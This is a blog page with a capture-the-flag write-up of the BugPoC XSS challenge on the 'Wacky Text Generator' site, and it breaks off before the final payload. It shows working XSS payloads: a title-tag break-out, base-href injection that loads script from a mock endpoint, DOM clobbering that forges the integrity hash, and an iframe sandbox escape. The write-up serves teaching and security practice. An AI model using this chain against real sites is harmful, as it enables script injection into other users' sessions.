@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Finger+Paint&family=Roboto:wght@100&display=swap" rel="stylesheet">
+        <link href="/fonts/meslo.ttf" rel="stylesheet">
+        <title>BugPoC XSS Challenge - Buggy Calculator</title>        
+    <link rel="stylesheet" href="/assets/404.b2188d1d.css" /></head>
+
+    <body class="
+        bg-[#3a3e4a]
+        font-meslo
+        pb-5
+
+        flex
+        flex-col
+
+        pt-[2vh]
+        pr-[25vh]
+        pl-[25vh]
+        gap-5
+    ">
+      <div class="
+        flex 
+        flex-row 
+        truncate
+        gap-5
+      ">
+        <div class="
+          flex
+          border-dashed
+          border-2
+          border-gray-500
+          rounded-lg
+        ">
+          <div class="
+	bg-[#464b59]
+	rounded-lg
+	text-white
+	p-5
+">
+	<div class="
+    p-4
+    font-bold
+    text-3xl
+    text-center
+    hover:animate-waving-hand
+">
+    <button onclick="
+        (document.referrer.includes(document.location.host)
+        && document.location.origin + '/' == document.referer
+        )
+        ? window.history.back()
+        : window.location.href = '/'
+    ">👈</button>
+</div>
+</div>
+        </div>
+        <div class="
+          rounded-lg
+          shrink grow
+          border-dashed
+          border-2
+          border-gray-500
+        ">
+          <div class="
+	bg-[#464b59]
+	rounded-lg
+	text-white
+	p-5
+">
+	<div class="
+	p-2
+	font-navpost
+	text-center
+  text-yellow-300
+	text-3xl
+">
+	<a href="bugpoc-xss-challenge-wacky-text-generator">
+		BugPoC XSS Challenge - Buggy Calculator
+	</a>
+</div>
+
+<p class="
+	font-sans
+	text-center
+  text-gray-300
+	italic 
+	hover:not-italic">
+	Reading time: 8 minutes
+</p>
+</div>
+        </div>
+      </div>
+
+    <div class="
+      bg-[#434854]
+      rounded-lg
+      text-gray-300
+      tracking-wider
+      px-8
+
+      cursor-auto
+
+      border-dashed
+      border-2
+      border-gray-500
+      
+      min-w-full
+      static
+      gap-1
+      leading-7
+
+      prose
+      prose-headings:text-yellow-400
+      prose-em:text-yellow-400
+
+      prose-a:text-yellow-400 
+      hover:prose-a:text-yellow-600
+      prose-a:cursor-pointer
+
+      prose-code:text-yellow-400
+      prose-code:before:content-['']
+      prose-code:after:content-['']
+
+      prose-strong:text-yellow-400
+      
+      prose-img:rounded-xl
+      prose-img:min-w-full
+
+      prose-img:outline
+      prose-img:outline-offset-2 
+      prose-img:outline-4
+
+      prose-pre:outline
+      prose-pre:outline-offset-2 
+      prose-pre:outline-4
+
+      text-lg
+      text-justify
+      prose-h1:before:content-['#_']
+      prose-h2:before:content-['#_']
+      prose-h3:before:content-['#_']
+      prose-h4:before:content-['#_']
+      prose-h5:before:content-['#_']
+      
+      prose-h1:text-2xl
+      prose-h2:text-xl
+      prose-h3:text-xl
+      prose-h4:text-xl
+      prose-h5:text-xl
+      
+      prose-h1:leading-8
+      prose-h2:leading-8
+      prose-h3:leading-8
+      prose-h4:leading-8
+      prose-h5:leading-8
+      
+      prose-h1:font-navpost
+      prose-h2:font-navpost
+      prose-h3:font-navpost
+      prose-h4:font-navpost
+      prose-h5:font-navpost
+
+      list-inside
+      marker:text-yellow-400
+    " id="post">
+      <div class="
+          prose-img:border-4
+          prose-img:border-gray-500
+        ">
+          <img src="/images/announcement-bugpoc-challenge4.jpeg">
+        </div>
+      <h2 id="introduction">Introduction</h2>
+<p>On november 5, the announcement above popped up to me and the rules are:</p>
+<ul>
+<li>We must pop an alert(origin) showing <a href="https://wacky.buggywebsite.com/" target="_blank" rel="noopener noreferrer">https://wacky.buggywebsite.com</a>.</li>
+<li>We must bypass <strong>CSP</strong>.</li>
+<li>It must be reproducible using the latest version of <em>Google Chrome</em>.</li>
+<li>We must provide a working proof-of-concept on <a href="https://bugpoc.com/" target="_blank" rel="noopener noreferrer">bugpoc.com</a>.</li>
+</ul>
+<h2 id="recon--html-injection">Recon &#x26; HTML injection</h2>
+<p>The Wacky Text Generator is an app to generate custom texts with random colors and fonts as you can see below.</p>
+<p><img src="/images/bugpoc-xss-challenge4-test.gif" alt="alt text for screen readers"></p>
+<p>Generating some custom texts, we can notice the content in iframe. Looking at the source code, we figure out:</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;</span><span style="color: #F92672">iframe</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">src</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"frame.html?param=Hello, World!"</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">name</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"iframe"</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">id</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"theIframe"</span><span style="color: #F8F8F2">>&#x3C;/</span><span style="color: #F92672">iframe</span><span style="color: #F8F8F2">></span></span></code></pre>
+<p>Let’s navigate to <code>frame.html?param=Hello,%20World!</code>.</p>
+<p><img src="/images/bugpoc-xss-challenge4-erroriframe.png" alt="Erro Iframe"></p>
+<p>We received an error. Let’s look back at the source code to figure out what is happening.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #88846F">// verify we are in an iframe</span></span>
+<span class="line"><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (window.name </span><span style="color: #F92672">==</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'iframe'</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #88846F">// securely load the frame analytics code</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (fileIntegrity.value) {</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #88846F">// create a sandboxed iframe</span></span>
+<span class="line"><span style="color: #F8F8F2">    analyticsFrame </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document.</span><span style="color: #A6E22E">createElement</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'iframe'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">    analyticsFrame.</span><span style="color: #A6E22E">setAttribute</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'sandbox'</span><span style="color: #F8F8F2">, </span><span style="color: #E6DB74">'allow-scripts allow-same-origin'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">    analyticsFrame.</span><span style="color: #A6E22E">setAttribute</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'class'</span><span style="color: #F8F8F2">, </span><span style="color: #E6DB74">'invisible'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">    document.body.</span><span style="color: #A6E22E">appendChild</span><span style="color: #F8F8F2">(analyticsFrame);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #88846F">// securely add the analytics code into iframe</span></span>
+<span class="line"><span style="color: #F8F8F2">    script </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document.</span><span style="color: #A6E22E">createElement</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'script'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">    script.</span><span style="color: #A6E22E">setAttribute</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'src'</span><span style="color: #F8F8F2">, </span><span style="color: #E6DB74">'files/analytics/js/frame-analytics.js'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">    script.</span><span style="color: #A6E22E">setAttribute</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'integrity'</span><span style="color: #F8F8F2">, </span><span style="color: #E6DB74">'sha256-'</span><span style="color: #F92672">+</span><span style="color: #F8F8F2">fileIntegrity.value);</span></span>
+<span class="line"><span style="color: #F8F8F2">    script.</span><span style="color: #A6E22E">setAttribute</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'crossorigin'</span><span style="color: #F8F8F2">, </span><span style="color: #E6DB74">'anonymous'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">    analyticsFrame.contentDocument.body.</span><span style="color: #A6E22E">appendChild</span><span style="color: #F8F8F2">(script);</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span></span>
+<span class="line"><span style="color: #F8F8F2">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">} </span><span style="color: #F92672">else</span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">  document.body.innerHTML </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`</span></span>
+<span class="line"><span style="color: #E6DB74">  &#x3C;h1>Error&#x3C;/h1></span></span>
+<span class="line"><span style="color: #E6DB74">  &#x3C;h2>This page can only be viewed from an iframe.&#x3C;/h2></span></span>
+<span class="line"><span style="color: #E6DB74">  &#x3C;video width="400" controls></span></span>
+<span class="line"><span style="color: #E6DB74">    &#x3C;source src="movie.mp4" type="video/mp4"></span></span>
+<span class="line"><span style="color: #E6DB74">  &#x3C;/video>`</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span></code></pre>
+<p>The error is quite simple to solve. The <code>window.name</code> is a global variable in which its content is maintained by the browser when we refresh the page (including through different domains) <a href="https://developer.mozilla.org/en-US/docs/Glossary/Global_object" target="_blank" rel="noopener noreferrer">[1]</a>.</p>
+<p>Thus, we only need to define the content of <code>window.name</code> to <code>iframe</code> before access it.</p>
+<p><img src="/images/bugpoc-xss-challenge4-helloworld.png" alt="winddow.name"></p>
+<p>Along those lines, we found wherein the code we need to focus on. Let’s understand how the user input is handled.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">randomInteger</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">max</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> Math.</span><span style="color: #A6E22E">floor</span><span style="color: #F8F8F2">(Math.</span><span style="color: #A6E22E">random</span><span style="color: #F8F8F2">() </span><span style="color: #F92672">*</span><span style="color: #F8F8F2"> Math.</span><span style="color: #A6E22E">floor</span><span style="color: #F8F8F2">(max));</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span>
+<span class="line"><span style="color: #F8F8F2">     </span></span>
+<span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">makeRandom</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">element</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">      </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> ( </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> i </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">; i </span><span style="color: #F92672">&#x3C;</span><span style="color: #F8F8F2"> element.length; i</span><span style="color: #F92672">++</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">         </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> createNewText </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">''</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">         </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> htmlColorTag </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'color:'</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">         </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> ( </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> j </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">; j </span><span style="color: #F92672">&#x3C;</span><span style="color: #F8F8F2"> element[i].textContent.length; j</span><span style="color: #F92672">++</span><span style="color: #F8F8F2"> ) {</span></span>
+<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> riFonts </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">randomInteger</span><span style="color: #F8F8F2">(fonts.length);</span></span>
+<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> riColors </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">randomInteger</span><span style="color: #F8F8F2">(colors.length);</span></span>
+<span class="line"><span style="color: #F8F8F2">            createNewText </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> createNewText </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"&#x3C;span class='"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> fonts[riFonts] </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"' style='"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> htmlColorTag </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> colors[riColors] </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"'>"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> element[i].textContent[j] </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"&#x3C;/span>"</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">         }</span></span>
+<span class="line"><span style="color: #F8F8F2">         element[i].innerHTML </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> createNewText;</span></span>
+<span class="line"><span style="color: #F8F8F2">  }              </span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> text </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document.</span><span style="color: #A6E22E">getElementsByClassName</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'text'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #A6E22E">makeRandom</span><span style="color: #F8F8F2">(text);</span></span></code></pre>
+<p>When we define the URL parameter <code>param</code> to <code>something</code>, each character is converted into <code>&#x3C;span></code> tag via <code>makeRandom</code> function call.</p>
+<p><img src="/images/bugpoc-xss-challenge4-something.png" alt="Conversion"></p>
+<p>It doest not seem we need to expend a lot of time on it, since each character is in a different tag and we cannot do too much.</p>
+<p>Looking back at the source code, it has something really interesting thing which is not handled on the client-side.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;</span><span style="color: #F92672">title</span><span style="color: #F8F8F2">></span></span>
+<span class="line"><span style="color: #F8F8F2">        something</span></span>
+<span class="line"><span style="color: #F8F8F2">&#x3C;/</span><span style="color: #F92672">title</span><span style="color: #F8F8F2">></span></span></code></pre>
+<p>The parameter content is put into a <code>title</code> tag. Let’s try to inject some HTML tag closing the title tag like this <code>&#x3C;/title>&#x3C;h1>something&#x3C;/h1></code>.</p>
+<p><img src="/images/bugpoc-xss-challenge4-htmlsomething.png" alt="HTML injection"></p>
+<p>It’s worked! Now let’s try to execute <code>alert(origin)</code> via <code>&#x3C;/title>&#x3C;img src onerror=alert(origin)></code>.</p>
+<p><img src="/images/bugpoc-xss-challenge4-imgerror.png" alt="HTML injection"></p>
+<p>We got an error about Content-Security policy. Well, from the beginning we already know that we need to bypass it. Let’s see what we are allowed to do with it.</p>
+<h2 id="content-security-policy-bypass">Content-Security policy bypass</h2>
+<p>Access the <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener noreferrer">CSP Evaluator</a>. That is a nice tool to evaluate CSP.</p>
+<p>We only need to send the target URL <code>https://wacky.buggywebsite.com</code>.</p>
+<p><img src="/images/bugpoc-xss-challenge4-csp.png" alt="CSP evaluator"></p>
+<p>Looking at the <code>console</code> of the browser (<em>press F12</em>), we can see an error with GET HTTP request to <code>https://effectrenan.com/files/analytics/js/frame-analytics.js</code> . Hence, we validated what we were thinking before.</p>
+<p>There is an important information about CSP we need to note. The target site is setting the directive <code>script-src</code> to <code>nonce</code>, which is used for the browser to verify if a tag is trusted to execute some Javascript code <a href="https://developers.google.com/web/fundamentals/security/csp" target="_blank" rel="noopener noreferrer">[2]</a>. This <code>nonce</code> is a hash randomly generated by the server in each request made. So we cannot guess it.</p>
+<p>The file <code>files/analytics/js/frame-analytics.js</code> is being imported via <code>script</code> tag with a valid <code>nonce</code> because it comes directly from the server. Consequently, we can put any content in it.</p>
+<p>Let’s test it. We need to create an HTTP server to receive the request in which it hosts the path file <code>files/analytics/js/frame-analytics.js</code> with the content <code>alert(origin)</code>. We can do it with BugPoC’s tools.</p>
+<p>Access <a href="https://bugpoc.com/testers/other/mock" target="_blank" rel="noopener noreferrer">Mock Endpoint Builder</a>. Configs:</p>
+<ul>
+<li>Status code: <code>200</code>;</li>
+<li>Response Headers: <code>{"Access-Control-Allow-Origin": "*"}</code>;</li>
+<li>Response Body: <code>alert(origin)</code>.</li>
+</ul>
+<p>The response header <code>Access-Control-Allow-Origin: *</code> is necessary to allow any site to import the content. Click on <code>Create!</code> button to generate an URL.</p>
+<p><img src="/images/bugpoc-xss-challenge4-content.png" alt="CSP evaluator"></p>
+<p>The URL looks like: <code>https://mock.bugpoc.ninja/de890d89-f23c-4cde-ac41-028e585860af/m?sig=24c29f888d18bf6c7a9ecda084ab34aae96fa1f27233a70fd56861281c0a541e&#x26;statusCode=200&#x26;headers=%7B%22Access-Control-Allow-Origin%22%3A%22*%22%7D&#x26;body=alert(origin)</code>.</p>
+<p>We have an HTTP server hosting the content, but it needs to host the content in the path <code>files/analytics/js/frame-analytics.js</code>. So we can use another nice BugPoC’s tool to ignore this path and make a redirect.</p>
+<p>Access <a href="https://bugpoc.com/testers/other/redir" target="_blank" rel="noopener noreferrer">Flexible Redirector</a>. Put the URL generated before and click on Create! button.</p>
+<p><img src="/images/bugpoc-xss-challenge4-redirect.png" alt="CSP evaluator"></p>
+<p>Updating the payload: <code>&#x3C;title>&#x3C;base href="&#x3C;Flexible Redirector URL>" /></code>.</p>
+<p><img src="/images/bugpoc-xss-challenge4-error-integrity.png" alt="Payload"></p>
+<p>We got an error about resources integrity. Let’s understand what it is used for.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #88846F">// securely add the analytics code into iframe</span></span>
+<span class="line"><span style="color: #F8F8F2">script </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document.</span><span style="color: #A6E22E">createElement</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'script'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">script.</span><span style="color: #A6E22E">setAttribute</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'src'</span><span style="color: #F8F8F2">, </span><span style="color: #E6DB74">'files/analytics/js/frame-analytics.js'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">script.</span><span style="color: #A6E22E">setAttribute</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'integrity'</span><span style="color: #F8F8F2">, </span><span style="color: #E6DB74">'sha256-'</span><span style="color: #F92672">+</span><span style="color: #F8F8F2">fileIntegrity.value);</span></span>
+<span class="line"><span style="color: #F8F8F2">script.</span><span style="color: #A6E22E">setAttribute</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'crossorigin'</span><span style="color: #F8F8F2">, </span><span style="color: #E6DB74">'anonymous'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">analyticsFrame.contentDocument.body.</span><span style="color: #A6E22E">appendChild</span><span style="color: #F8F8F2">(script);</span></span></code></pre>
+<p>To use the attibute <code>integrity</code>, the server needs to generate a hash of the static content and pass it through attribute, meaning a static hash.</p>
+<p>Every time the page is loaded, the browser checks if the attribute hash and the content hash that is trying to be loaded is the same <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity" target="_blank" rel="noopener noreferrer">[3]</a>. This avoids malicious content to be loaded and executed.</p>
+<p>Let’s see where is defined the content of the variable <code>fileIntegrity</code>.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">window.fileIntegrity </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> window.fileIntegrity </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #E6DB74">'rfc'</span><span style="color: #F8F8F2"> : </span><span style="color: #E6DB74">' https://w3c.github.io/webappsec-subresource-integrity/'</span><span style="color: #F8F8F2">,</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #E6DB74">'algorithm'</span><span style="color: #F8F8F2"> : </span><span style="color: #E6DB74">'sha256'</span><span style="color: #F8F8F2">,</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #E6DB74">'value'</span><span style="color: #F8F8F2"> : </span><span style="color: #E6DB74">'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E='</span><span style="color: #F8F8F2">,</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #E6DB74">'creationtime'</span><span style="color: #F8F8F2"> : </span><span style="color: #AE81FF">1602687229</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span></code></pre>
+<p>The <code>fileIntegrity</code> is a global variable. Unfortunately, we cannot do the same thing that we did with <code>window.name</code> in the beginning, because this time <code>fileIntegrity</code> is not preserved by the browser when we refresh the page.</p>
+<h2 id="dom-clobbering">DOM clobbering</h2>
+<p>The big problem with global variables is when we have an HTML injection. It is possible to define some global variables and their attributes through HTML tags <a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener noreferrer">[4]</a>. This technique is known as DOM clobbering.</p>
+<p>If we execute <code>console.log(window.something)</code>, the answer will be the DOM element <code>&#x3C;div id="something">&#x3C;/div></code>.</p>
+<p><img src="/images/bugpoc-xss-challenge4-global.png" alt="DOM clobbering"></p>
+<p>If the HTML tag defined has some attributes, we can access it like this <code>window.something.attribute</code>.</p>
+<p>In that case <code>fileIntegrity</code> is accessing the attribute <code>value</code> to get the hash. So we need to find an HTML tag which has the attribute <code>value</code> by default.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;</span><span style="color: #F92672">input</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">id</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"fileIntegrity"</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">value</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"</span><span style="color: #F44747">&#x3C;</span><span style="color: #E6DB74">Our hash>"</span><span style="color: #F8F8F2">></span></span></code></pre>
+<p><img src="/images/bugpoc-xss-challenge4-globalimg.png" alt="DOM clobbering"></p>
+<p>Now we only need to get the appropriate hash for <code>alert(origin)</code>. This task is simple because when the Integrity exception occurs, it shows <code>sot4TsoYPMqH9HF0f7P0xsez7m6YnNiGcQWr7OJ6FBc=</code>.</p>
+<p>But we can generate the same hash with the following command:</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">echo</span><span style="color: #F8F8F2"> -n </span><span style="color: #E6DB74">"alert(origin)"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">|</span><span style="color: #F8F8F2"> openssl dgst -sha256 -binary </span><span style="color: #F92672">|</span><span style="color: #F8F8F2"> openssl base64 -A</span></span></code></pre>
+<p>Updating the payload:</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;/</span><span style="color: #F92672">title</span><span style="color: #F8F8F2">>&#x3C;</span><span style="color: #F92672">base</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">href</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"</span><span style="color: #F44747">&#x3C;</span><span style="color: #E6DB74">Flexible Redirector URL>"</span><span style="color: #F44747">/</span><span style="color: #F8F8F2"> >&#x3C;</span><span style="color: #F92672">input</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">id</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"fileIntegrity"</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">value</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"sot4TsoYPMqH9HF0f7P0xsez7m6YnNiGcQWr7OJ6FBc="</span><span style="color: #F8F8F2">/></span></span></code></pre>
+<p>And again we got one more error. The problem now is about we are executing a Javascript code inside a sandboxed <code>iframe</code>.</p>
+<p><img src="/images/bugpoc-xss-challenge4-iframe_sandboxed.png" alt="DOM clobbering"></p>
+<h2 id="iframe-sandbox-escape">Iframe sandbox escape</h2>
+<p>Let’s look at the attributes of this <code>iframe</code> to see what we can exploit.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #88846F">// create a sandboxed iframe</span></span>
+<span class="line"><span style="color: #F8F8F2">analyticsFrame </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document.</span><span style="color: #A6E22E">createElement</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'iframe'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">analyticsFrame.</span><span style="color: #A6E22E">setAttribute</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'sandbox'</span><span style="color: #F8F8F2">, </span><span style="color: #E6DB74">'allow-scripts allow-same-origin'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">analyticsFrame.</span><span style="color: #A6E22E">setAttribute</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'class'</span><span style="color: #F8F8F2">, </span><span style="color: #E6DB74">'invisible'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">document.body.</span><span style="color: #A6E22E">appendChild</span><span style="color: #F8F8F2">(analyticsFrame);</span></span></code></pre>
+<p>The attribute <code>allow-scripts</code> means we can execute Javascript code and the attribute <code>allow-same-origin</code> means we need to be in the same-origin <a href="https://developer.mozilla.org/pt-BR/docs/Web/HTML/Element/iframe" target="_blank" rel="noopener noreferrer">[5]</a>.</p>
+<p>Well, actually we are respecting these two rules. The problem is we cannot execute the <code>alert</code> function. For it, we need the flag <code>allow-modals</code>.</p>
+<p>To bypass it, we have to remember we are trying to execute Javascript code in the same-origin. In other words, the origin of the <code>iframe</code> (child) and the top frame is the same. Hence, we are not violating the CSP whether we try to execute a Javascript function through the top frame call <a href="https://developers.google.com/web/fundamentals/security/csp" target="_blank" rel="noopener noreferrer">[2]</a>.</p>
+<p>Let’s test it on the browser. We need to stay tuned to execute the below command from the child frame.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">window.top.</span><span style="color: #A6E22E">alert</span><span style="color: #F8F8F2">(origin)</span></span></code></pre>
+<p><img src="/images/bugpoc-xss-challenge4-topframealert.png" alt="DOM clobbering"></p>
+<p>Now we need to update the payload again, generating a new base URL to embed the content <code>window.top.alert(origin)</code> and update the hash.</p>
+<p><strong>Note:</strong> Do not forget to encode the URL. In some cases is necessary because the hash can contain <code>+</code> which means <code>space</code>.</p>
+<p>The final payload will be:</p>
